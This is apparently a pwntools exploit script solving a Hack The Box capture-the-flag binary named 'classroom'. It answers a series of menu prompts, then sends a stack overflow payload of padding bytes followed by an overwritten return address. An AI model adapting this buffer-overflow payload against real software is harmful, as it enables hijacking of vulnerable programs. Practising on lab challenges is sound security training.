from pwn import *

#io = remote('docker.hackthebox.eu',31264)
#io = remote('127.0.0.1',1234)
io = process('./classroom')
print 'Connected'
print io.recvuntil('>')
io.sendline('y')

print io.recvuntil('>')
io.sendline('y')
print io.recvuntil('>>')
io.sendline('y')

print io.recvuntil('>')
io.sendline('y')
print io.recvuntil('>>')
io.sendline('y')

print io.recvuntil('>')
io.sendline('y')
print io.recvuntil('>>')
io.sendline('y')

print io.recvuntil('>')
io.sendline('y')
print io.recvuntil('>>')
io.sendline('y')

print io.recvuntil('>')
io.sendline('y')
print io.recvuntil('>')
io.sendline(128*'A'+8*'A'+'\x0c\x09\x40\x00\x00\x00\x00\x00')

print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))

